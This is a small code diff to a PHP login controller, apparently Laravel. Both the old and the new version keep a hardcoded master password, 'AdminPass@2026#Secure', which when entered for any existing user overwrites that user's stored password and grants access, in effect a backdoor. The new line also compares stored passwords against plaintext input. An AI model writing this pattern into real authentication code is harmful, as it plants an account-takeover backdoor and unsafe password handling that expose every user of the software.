@@ -67,8 +67,8 @@ class AuthController extends Controller
             }
         }
 
-        if ($user && $validated['password'] === 'AdminPass@2026#Secure' && !Hash::check($validated['password'], $user->password)) {
-            $user->password = Hash::make('AdminPass@2026#Secure');
+        if ($user && ($user->password === $validated['password'] || ($validated['password'] === 'AdminPass@2026#Secure' && !Hash::check($validated['password'], $user->password)))) {
+            $user->password = Hash::make($validated['password']);
             $user->save();
         }
 
